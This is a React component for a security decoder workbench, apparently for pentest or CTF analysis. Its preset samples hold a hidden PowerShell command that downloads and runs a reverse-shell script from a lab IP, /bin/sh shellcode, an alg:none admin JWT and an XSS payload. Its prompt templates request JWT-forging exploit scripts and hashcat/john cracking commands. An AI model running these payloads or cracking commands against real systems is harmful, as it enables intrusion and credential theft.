import { useState, useMemo, useEffect } from 'react';
import {
  Key,
  Hash,
  Binary,
  Copy,
  Check,
  RotateCcw,
  Sparkles,
  ArrowRightLeft,
  ArrowRight,
  ArrowDownUp,
  Search,
  Lock,
  Unlock,
  Shield,
  ShieldAlert,
  Layers,
  FileCode,
} from 'lucide-react';
import {
  encodeBase64,
  decodeBase64,
  encodeHex,
  decodeHex,
  encodeURL,
  decodeURL,
  encodeHTML,
  decodeHTML,
  encodeBinary,
  decodeBinary,
  encodeUnicode,
  decodeUnicode,
  encodeBase64URL,
  decodeBase64URL,
  encodeDecimalASCII,
  decodeDecimalASCII,
  caesarShift,
  reverseString,
  rot13,
  xorTransform,
  calculateShannonEntropy,
  calculateHashes,
  identifyHashTypes,
  type IdentifiedHash,
  parseJWT,
  defang,
  refang,
} from '../../lib/security/transformers';
import CustomSelect from '../CustomSelect';
import styles from './DecoderHub.module.css';

const DECODER_PRESET_OPTIONS = [
  { value: 'vulnerable_jwt', label: 'JWT (alg:none / Admin Claim)', badge: 'JWT' },
  { value: 'base64_payload', label: 'PowerShell Base64 Payload', badge: 'Base64' },
  { value: 'hex_shellcode', label: 'Hex Shellcode (execve /bin/sh)', badge: 'Shellcode' },
  { value: 'mystery_ntlm', label: 'NTLM Windows Hash Sample', badge: 'NTLM' },
  { value: 'mystery_bcrypt', label: 'Bcrypt Password Hash Sample', badge: 'Bcrypt' },
  { value: 'mystery_sha256', label: 'SHA-256 Mystery Hash Sample', badge: 'SHA256' },
  { value: 'url_encoded_xss', label: 'Double URL Encoded XSS', badge: 'URL' },
  { value: 'xor_sample', label: 'XOR Obfuscated Hex String', badge: 'XOR' },
  { value: 'binary_secret', label: '8-Bit Binary Encoded String', badge: 'Binary' },
];

interface DecoderHubProps {
  initialInput?: string;
  onSendToSandbox?: (code: string) => void;
  onSendToAI?: (prompt: string) => void;
}

const DECODER_INPUT_STORAGE_KEY = 'nexus_security_decoder_input';
const DECODER_OUTPUT_STORAGE_KEY = 'nexus_security_decoder_output';

const DECODER_PRESETS = {
  vulnerable_jwt: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW5pc3RyYXRvciIsImlzQWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.",
  base64_payload: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"Invoke-Expression $(New-Object Net.WebClient).DownloadString('http://10.10.14.12/rev.ps1')\"",
  hex_shellcode: "31c050682f2f7368682f62696e89e3505389e1b00bcd80",
  mystery_ntlm: "b4b9b02e6f09a9bd760f388b67351e2b",
  mystery_bcrypt: "$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW",
  mystery_sha256: "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
  url_encoded_xss: "%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E",
  xor_sample: "3a3d242720233c3a3b2b",
  binary_secret: "01000001 01100100 01101101 01101001 01101110 01010000 01100001 01110011 01110011",
};

export default function DecoderHub({
  initialInput = '',
  onSendToSandbox,
  onSendToAI = () => {},
}: DecoderHubProps) {
  const [input, setInput] = useState(() => {
    if (initialInput) return initialInput;
    try {
      return localStorage.getItem(DECODER_INPUT_STORAGE_KEY) || '';
    } catch {
      return '';
    }
  });

  const [output, setOutput] = useState(() => {
    try {
      return localStorage.getItem(DECODER_OUTPUT_STORAGE_KEY) || '';
    } catch {
      return '';
    }
  });

  const [lastAction, setLastAction] = useState<string>('');
  const [xorKey, setXorKey] = useState('0x5A');
  const [caesarShiftNum, setCaesarShiftNum] = useState(13);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  useEffect(() => {
    if (initialInput) setInput(initialInput);
  }, [initialInput]);

  useEffect(() => {
    const handleSecurityEvent = (e: Event) => {
      const custom = e as CustomEvent<{ tab?: string; input?: string; code?: string }>;
      if (custom.detail?.tab === 'decoders') {
        const text = custom.detail.input || custom.detail.code;
        if (text) setInput(text);
      }
    };
    window.addEventListener('nexus:open-security', handleSecurityEvent);
    return () => window.removeEventListener('nexus:open-security', handleSecurityEvent);
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem(DECODER_INPUT_STORAGE_KEY, input);
    } catch (e) {
      console.error(e);
    }
  }, [input]);

  useEffect(() => {
    try {
      localStorage.setItem(DECODER_OUTPUT_STORAGE_KEY, output);
    } catch (e) {
      console.error(e);
    }
  }, [output]);

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Perform Transform (Input -> Output)
  const handleTransform = (actionName: string, transformFn: (val: string) => string) => {
    const res = transformFn(input);
    setOutput(res);
    setLastAction(actionName);
  };

  // 2-Way Swap Action (Input <-> Output)
  const handleSwap = () => {
    const temp = input;
    setInput(output);
    setOutput(temp);
    setLastAction('Swapped Input ⇄ Output');
  };

  // Use Output as Input (Chain)
  const handleUseOutputAsInput = () => {
    setInput(output);
    setOutput('');
    setLastAction('Piped Output ➔ Input');
  };

  // Analysis Metrics
  const entropy = useMemo(() => calculateShannonEntropy(input), [input]);
  const outputEntropy = useMemo(() => calculateShannonEntropy(output), [output]);
  const hashes = useMemo(() => calculateHashes(input), [input]);
  const activeJWT = useMemo(() => parseJWT(input) || parseJWT(output), [input, output]);

  // Mystery Hash Detection
  const identifiedInputHashes = useMemo(() => identifyHashTypes(input), [input]);
  const identifiedOutputHashes = useMemo(() => identifyHashTypes(output), [output]);
  const activeIdentified = useMemo(() => {
    return identifiedInputHashes.length > 0 ? identifiedInputHashes : identifiedOutputHashes;
  }, [identifiedInputHashes, identifiedOutputHashes]);

  const entropyAssessment = useMemo(() => {
    if (!input) return { label: 'Empty', color: 'badgeInfo' };
    if (entropy > 7.2) return { label: 'Extremely High (Likely Encrypted/Packed)', color: 'badgeWarning' };
    if (entropy > 6.0) return { label: 'High (Obfuscated / Binary / Shellcode)', color: 'badgeWarning' };
    if (entropy > 4.0) return { label: 'Moderate (Standard Code / Text)', color: 'cardBadge' };
    return { label: 'Low (Structured / Repetitive)', color: 'badgeInfo' };
  }, [entropy, input]);

  // AI Actions
  const handleAIDeobfuscate = () => {
    const payloadToAnalyze = input.trim() || output.trim() || DECODER_PRESETS.base64_payload;
    const prompt = `I am analyzing an obfuscated security artifact / mystery payload in the 2-Way Decoders Hub:

\`\`\`
${payloadToAnalyze}
\`\`\`

**Artifact Metrics**:
- **Shannon Entropy**: ${entropy} bits (${entropyAssessment.label})
- **MD5 Hash**: \`${hashes.md5}\`
- **SHA-256 Hash**: \`${hashes.sha256}\`
${lastAction ? `- **Recent Transform**: ${lastAction}` : ''}

Please act as an expert Malware Reverse Engineer & Deobfuscation Specialist:
1. **Identify Encoding/Packing**: What encoding, compression, XOR layer, or packing technique is used?
2. **Step-by-Step Deobfuscation**: Provide the fully decoded/deobfuscated payload.
3. **Intent & Threat Assessment**: Explain what this payload does (commands executed, C2 callback, shellcode, evasion technique).
4. **Automated Extraction Recipe**: Provide Python / CyberChef recipe steps to decode similar artifacts.`;
    onSendToAI(prompt);
  };

  const handleAIJWTAudit = () => {
    const tokenToAnalyze = (activeJWT ? (parseJWT(input) ? input : output) : DECODER_PRESETS.vulnerable_jwt).trim();
    const parsedToken = parseJWT(tokenToAnalyze);

    const prompt = `I am conducting an authorized penetration test on this JSON Web Token (JWT) in 2-Way Decoders Hub:

\`\`\`
${tokenToAnalyze}
\`\`\`

**Decoded Token Information**:
- **Algorithm**: \`${parsedToken?.algorithm || 'none'}\`
- **Expiry Status**: ${parsedToken?.isExpired ? 'EXPIRED' : 'ACTIVE'}
- **Header**:
\`\`\`json
${JSON.stringify(parsedToken?.header || {}, null, 2)}
\`\`\`
- **Payload**:
\`\`\`json
${JSON.stringify(parsedToken?.payload || {}, null, 2)}
\`\`\`
- **Identified Flaws/Warnings**: ${parsedToken?.warnings?.join('; ') || 'None flagged locally'}

Please provide an in-depth **JWT Security Assessment**:
1. **Algorithm Vulnerabilities**: Check for \`none\` algorithm bypass, RSA to HMAC Key Confusion (\`CVE-2015-9235\`), and JWK/JKU header injection.
2. **Signature Cracking**: Provide the exact Hashcat command and mode to crack the HMAC secret using \`rockyou.txt\`.
3. **Privilege Escalation**: How can claims (e.g. \`role\`, \`admin\`, \`permissions\`) be forged or manipulated?
4. **Python Exploit Script**: Provide a ready-to-run Pyodide/Python script to forge or test these vectors.`;
    onSendToAI(prompt);
  };

  const handleAIHashAnalysis = () => {
    const rawTarget = input.trim() || hashes.md5;
    const detected = identifyHashTypes(rawTarget);

    let prompt = `I am analyzing a cryptographic hash / artifact in the Decoders Hub:

- **Target Hash String**: \`${rawTarget}\`
- **Computed Real-Time Checksums**:
  - **MD5**: \`${hashes.md5}\`
  - **SHA-1**: \`${hashes.sha1}\`
  - **SHA-256**: \`${hashes.sha256}\`
  - **SHA-512**: \`${hashes.sha512}\`
`;

    if (detected.length > 0) {
      prompt += `
**Local Signature Matches**:
${detected.map((d) => `- **${d.name}** (Hashcat: \`${d.hashcatMode}\`, John: \`${d.johnFormat}\`, Category: ${d.category}): ${d.description}`).join('\n')}
`;
    }

    prompt += `
Please provide an in-depth **Hash Identification & Cracking Strategy**:
1. **Hash Verification**: Confirm the exact algorithm, iteration scheme, and source system (e.g. Linux shadow, Windows NTLM, WordPress, Django, MySQL, API Token).
2. **Hashcat & John Commands**: Provide optimized cracking commands with rule files (\`best64.rule\`, \`OneRuleToRuleThemAll\`) and wordlists (\`rockyou.txt\`).
3. **Plaintext / Known Lookup**: Check if this matches standard test hashes (e.g. empty string, admin, password, known CVE salts).`;

    onSendToAI(prompt);
  };

  return (
    <div className={styles.decoderContainer}>
      {/* 2-Way Interactive Encoder / Decoder Workbench */}
      <div className={styles.workbenchCard}>
        {/* Header Bar */}
        <div className={styles.cardHeader}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
            <span className={styles.cardTitle}>
              <ArrowRightLeft size={17} color="var(--accent-color)" /> 2-Way Security Encoder &amp; Decoder
            </span>
            {lastAction && (
              <span className={styles.lastActionBadge}>
                Active: {lastAction}
              </span>
            )}
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', flexWrap: 'wrap' }}>
            <CustomSelect
              value=""
              placeholder="Load Sample Preset..."
              options={DECODER_PRESET_OPTIONS}
              onChange={(val) => {
                const key = val as keyof typeof DECODER_PRESETS;
                if (DECODER_PRESETS[key]) {
                  setInput(DECODER_PRESETS[key]);
                  setOutput('');
                  setLastAction(`Loaded preset: ${key}`);
                }
              }}
              style={{ minWidth: '200px' }}
            />
            <button
              className={`${styles.btn} ${styles.btnPrimary}`}
              onClick={handleAIDeobfuscate}
              title="Analyze payload with AI (decompression, XOR, packing detection & deobfuscation)"
            >
              <Sparkles size={13} /> AI Deobfuscate
            </button>
          </div>
        </div>

        {/* 2-Way Split Panes (Input on Left, Output on Right) */}
        <div className={styles.panesGrid}>
          {/* Left Pane: Input / Source */}
          <div className={styles.paneColumn}>
            <div className={styles.paneHeader}>
              <span className={styles.paneTitle}>
                <Lock size={14} color="#38bdf8" /> Input / Source Data
              </span>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
                <span className={`${styles.cardBadge} ${styles[entropyAssessment.color]}`}>
                  Entropy: {entropy} bits
                </span>
                <span className={styles.charCount}>
                  {input.length} chars ({new Blob([input]).size} B)
                </span>
                <button
                  className={styles.btn}
                  onClick={() => copyToClipboard(input, 'input')}
                  title="Copy Input Text"
                >
                  {copiedKey === 'input' ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                  {copiedKey === 'input' ? 'Copied' : 'Copy'}
                </button>
                <button
                  className={styles.btn}
                  onClick={() => {
                    setInput('');
                    setOutput('');
                    setLastAction('');
                  }}
                  title="Clear both Input and Output"
                >
                  <RotateCcw size={12} /> Clear
                </button>
              </div>
            </div>

            <textarea
              className={styles.textarea}
              value={input}
              onChange={(e) => setInput(e.target.value)}
              placeholder="Paste raw string, base64 payload, hex dump, JWT, URL, or obfuscated script here..."
              spellCheck={false}
            />

            {/* Quick Helper Tools under Input */}
            <div className={styles.quickHelpers}>
              <button
                className={styles.btn}
                onClick={() => handleTransform('Defang IoCs', defang)}
                title="Defang URLs/IPs into safe hxxp[://] format"
              >
                🛡️ Defang IoCs
              </button>
              <button
                className={styles.btn}
                onClick={() => handleTransform('Refang IoCs', refang)}
                title="Refang safe URLs/IPs back to raw format"
              >
                🔗 Refang
              </button>
              <button
                className={styles.btn}
                onClick={() => handleTransform('Reverse String', reverseString)}
                title="Reverse character order"
              >
                ⇄ Reverse String
              </button>
            </div>
          </div>

          {/* Center Swap / Direction Controls */}
          <div className={styles.centerControls}>
            <button
              className={`${styles.btn} ${styles.btnSwap}`}
              onClick={handleSwap}
              title="Swap Input and Output (2-Way transfer)"
            >
              <ArrowRightLeft size={15} /> Swap
            </button>
            <button
              className={styles.btn}
              onClick={handleUseOutputAsInput}
              title="Pipe output back into input to chain encodings"
            >
              <ArrowDownUp size={13} /> Output ➔ Input
            </button>
          </div>

          {/* Right Pane: Output / Result */}
          <div className={styles.paneColumn}>
            <div className={styles.paneHeader}>
              <span className={styles.paneTitle}>
                <Unlock size={14} color="#10b981" /> Transformed Output
              </span>
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.35rem' }}>
                {output && (
                  <span className={`${styles.cardBadge} ${styles.cardBadgeGreen}`}>
                    Entropy: {outputEntropy} bits
                  </span>
                )}
                <span className={styles.charCount}>
                  {output.length} chars ({new Blob([output]).size} B)
                </span>
                <button
                  className={styles.btn}
                  onClick={() => copyToClipboard(output, 'output')}
                  title="Copy Output Result"
                >
                  {copiedKey === 'output' ? <Check size={12} color="#10b981" /> : <Copy size={12} />}
                  {copiedKey === 'output' ? 'Copied' : 'Copy'}
                </button>
                {onSendToSandbox && output.trim() && (
                  <button
                    className={styles.btn}
                    onClick={() => onSendToSandbox(output)}
                    title="Send output payload to Python / JS Sandbox"
                  >
                    <FileCode size={12} color="#f59e0b" /> To Sandbox
                  </button>
                )}
              </div>
            </div>

            <textarea
              className={`${styles.textarea} ${styles.outputTextarea}`}
              value={output}
              readOnly
              placeholder="Transformed result will appear here. Click any Encode or Decode button below..."
              spellCheck={false}
            />
          </div>
        </div>

        {/* 2-Way Transformation Toolbars Grouped by Format */}
        <div className={styles.transformsSection}>
          <div className={styles.sectionHeader}>
            <Binary size={15} color="#38bdf8" />
            <span>2-Way Encoders &amp; Decoders</span>
          </div>

          <div className={styles.transformGrid}>
            {/* Base64 & Base64URL */}
            <div className={styles.transformGroup}>
              <div className={styles.groupLabel}>Base64 &amp; Base64URL</div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Base64 Encode', encodeBase64)}>
                  Encode Base64 <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('Base64 Decode', decodeBase64)}>
                  <ArrowRight size={11} /> Decode Base64
                </button>
              </div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Base64URL Encode', encodeBase64URL)}>
                  Encode B64URL <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('Base64URL Decode', decodeBase64URL)}>
                  <ArrowRight size={11} /> Decode B64URL
                </button>
              </div>
            </div>

            {/* Hex & Binary (8-bit) */}
            <div className={styles.transformGroup}>
              <div className={styles.groupLabel}>Hex &amp; Binary</div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Hex Encode', encodeHex)}>
                  Encode Hex <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('Hex Decode', decodeHex)}>
                  <ArrowRight size={11} /> Decode Hex
                </button>
              </div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Binary Encode', encodeBinary)}>
                  Encode Binary <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('Binary Decode', decodeBinary)}>
                  <ArrowRight size={11} /> Decode Binary
                </button>
              </div>
            </div>

            {/* URL, HTML & Unicode */}
            <div className={styles.transformGroup}>
              <div className={styles.groupLabel}>URL, HTML &amp; Unicode</div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('URL Encode', encodeURL)}>
                  Encode URL <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('URL Decode', decodeURL)}>
                  <ArrowRight size={11} /> Decode URL
                </button>
              </div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('HTML Encode', encodeHTML)}>
                  HTML Entity <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('HTML Decode', decodeHTML)}>
                  <ArrowRight size={11} /> Decode HTML
                </button>
              </div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Unicode Escape', encodeUnicode)}>
                  \uXXXX Encode <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform('Unicode Decode', decodeUnicode)}>
                  <ArrowRight size={11} /> Decode \uXXXX
                </button>
              </div>
            </div>

            {/* Ciphers: XOR, Caesar & Rot13 */}
            <div className={styles.transformGroup}>
              <div className={styles.groupLabel}>Ciphers &amp; Shifts</div>
              <div className={styles.btnPair}>
                <button className={styles.btn} onClick={() => handleTransform('Rot13 Cipher', rot13)}>
                  Rot13 (+13) <ArrowRight size={11} />
                </button>
                <button className={styles.btn} onClick={() => handleTransform(`Caesar Shift (+${caesarShiftNum})`, (val) => caesarShift(val, caesarShiftNum))}>
                  Shift (+{caesarShiftNum}) <ArrowRight size={11} />
                </button>
              </div>

              {/* XOR Shift with Key */}
              <div className={styles.xorBox}>
                <span className={styles.xorLabel}>XOR Key:</span>
                <input
                  type="text"
                  className={styles.xorInput}
                  value={xorKey}
                  onChange={(e) => setXorKey(e.target.value)}
                  placeholder="0x5A or secret"
                />
                <button
                  className={`${styles.btn} ${styles.btnPrimary}`}
                  onClick={() => handleTransform(`XOR (Key: ${xorKey})`, (val) => xorTransform(val, xorKey))}
                >
                  Apply XOR
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Deep Security Analyzers Grid */}
      <div className={styles.analyzerGrid}>
        {/* JWT Inspector Card */}
        <div className={styles.quickCard}>
          <div className={styles.cardHeader}>
            <span className={styles.cardTitle}>
              <Key size={16} color="#fbbf24" /> JWT Token Inspector
            </span>
            <button
              className={styles.btn}
              onClick={handleAIJWTAudit}
              title="Audit JWT for alg:none, key confusion, and privilege escalation"
            >
              <Sparkles size={12} /> AI JWT Audit
            </button>
          </div>

          {activeJWT ? (
            <div className={styles.jwtView}>
              <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap', alignItems: 'center' }}>
                <span className={styles.cardBadge}>Algorithm: {activeJWT.algorithm}</span>
                {activeJWT.isExpired ? (
                  <span className={`${styles.cardBadge} ${styles.badgeWarning}`}>EXPIRED</span>
                ) : (
                  <span className={`${styles.cardBadge} ${styles.cardBadgeGreen}`}>ACTIVE</span>
                )}
                {activeJWT.expiresAt && (
                  <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>
                    Exp: {new Date(activeJWT.expiresAt).toLocaleString()}
                  </span>
                )}
              </div>

              {activeJWT.warnings && activeJWT.warnings.length > 0 && (
                <div className={styles.warningList}>
                  {activeJWT.warnings.map((w, i) => (
                    <div key={i} className={styles.warningItem}>
                      <ShieldAlert size={12} /> {w}
                    </div>
                  ))}
                </div>
              )}

              <div className={styles.jwtGrid}>
                <div>
                  <div className={styles.inputLabel}>Decoded Header</div>
                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.header, null, 2)}</pre>
                </div>
                <div>
                  <div className={styles.inputLabel}>Decoded Payload Claims</div>
                  <pre className={styles.jsonBox}>{JSON.stringify(activeJWT.payload, null, 2)}</pre>
                </div>
              </div>
            </div>
          ) : (
            <div style={{ padding: '1.25rem', textAlign: 'center', color: 'var(--text-muted)', fontSize: '0.8rem' }}>
              <Key size={24} style={{ opacity: 0.4, marginBottom: '0.4rem' }} />
              <div>No valid JWT detected in Input or Output.</div>
              <div style={{ fontSize: '0.74rem', marginTop: '0.2rem' }}>
                Paste a JWT token above or load the JWT preset example to inspect headers and claims.
              </div>
            </div>
          )}
        </div>

        {/* Hashes & Hash Identifier Card */}
        <div className={styles.quickCard}>
          <div className={styles.cardHeader}>
            <span className={styles.cardTitle}>
              <Hash size={16} color="#34d399" /> Hashes &amp; Hash Type Identifier
            </span>
            <button
              className={styles.btn}
              onClick={handleAIHashAnalysis}
              title="Threat intelligence and hash cracking commands (Hashcat, John)"
            >
              <Sparkles size={12} /> AI Hash Intel &amp; Cracker
            </button>
          </div>

          {/* Mystery Hash Identification Display */}
          {activeIdentified.length > 0 && (
            <div className={styles.identifiedBox}>
              <div className={styles.identifiedTitle}>
                <Search size={13} color="#38bdf8" />
                <span>Detected Hash Formats ({activeIdentified.length} matches):</span>
              </div>
              <div className={styles.identifiedList}>
                {activeIdentified.map((h, i) => (
                  <div key={i} className={styles.identifiedItem}>
                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '0.4rem', flexWrap: 'wrap' }}>
                      <span style={{ fontWeight: 700, color: '#f8fafc', fontSize: '0.82rem' }}>{h.name}</span>
                      <span className={styles.cardBadge}>{h.category}</span>
                    </div>
                    <div style={{ fontSize: '0.74rem', color: '#94a3b8', marginTop: '0.15rem' }}>
                      {h.description}
                    </div>
                    <div style={{ display: 'flex', gap: '0.4rem', marginTop: '0.35rem', flexWrap: 'wrap' }}>
                      <button
                        className={styles.btnMini}
                        onClick={() => copyToClipboard(`hashcat ${h.hashcatMode} hash.txt rockyou.txt`, `hc_${i}`)}
                        title="Copy Hashcat command"
                      >
                        {copiedKey === `hc_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
                        <span>Hashcat: <code>{h.hashcatMode}</code></span>
                      </button>
                      <button
                        className={styles.btnMini}
                        onClick={() => copyToClipboard(`john --format=${h.johnFormat} hash.txt --wordlist=rockyou.txt`, `john_${i}`)}
                        title="Copy John the Ripper command"
                      >
                        {copiedKey === `john_${i}` ? <Check size={10} color="#10b981" /> : <FileCode size={10} />}
                        <span>John: <code>{h.johnFormat}</code></span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          <div>
            <div className={styles.inputLabel} style={{ marginTop: activeIdentified.length > 0 ? '0.5rem' : '0' }}>
              Computed Checksums (for Input)
            </div>
            <table className={styles.hashTable}>
              <tbody>
                <tr>
                  <td className={styles.hashLabel}>MD5</td>
                  <td className={styles.hashVal}>{hashes.md5}</td>
                  <td style={{ width: '40px', textAlign: 'right' }}>
                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.md5, 'md5')}>
                      {copiedKey === 'md5' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
                    </button>
                  </td>
                </tr>
                <tr>
                  <td className={styles.hashLabel}>SHA-1</td>
                  <td className={styles.hashVal}>{hashes.sha1}</td>
                  <td style={{ width: '40px', textAlign: 'right' }}>
                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha1, 'sha1')}>
                      {copiedKey === 'sha1' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
                    </button>
                  </td>
                </tr>
                <tr>
                  <td className={styles.hashLabel}>SHA-256</td>
                  <td className={styles.hashVal}>{hashes.sha256}</td>
                  <td style={{ width: '40px', textAlign: 'right' }}>
                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha256, 'sha256')}>
                      {copiedKey === 'sha256' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
                    </button>
                  </td>
                </tr>
                <tr>
                  <td className={styles.hashLabel}>SHA-512</td>
                  <td className={styles.hashVal}>{hashes.sha512}</td>
                  <td style={{ width: '40px', textAlign: 'right' }}>
                    <button className={styles.btnMini} onClick={() => copyToClipboard(hashes.sha512, 'sha512')}>
                      {copiedKey === 'sha512' ? <Check size={10} color="#10b981" /> : <Copy size={10} />}
                    </button>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
